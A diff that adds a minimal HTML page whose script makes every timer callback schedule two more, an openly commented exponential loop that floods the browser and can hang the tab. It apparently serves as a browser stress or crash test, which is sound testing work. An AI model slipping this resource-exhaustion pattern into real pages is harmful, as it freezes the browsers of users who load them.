@@ -1,0 +1,6 @@
+<!doctype html><meta charset="utf-8">
+<script>
+  // Every callback schedules two more: exponential growth that never settles.
+  function f() { setTimeout(f, 0); setTimeout(f, 0) }
+  f()
+</script>
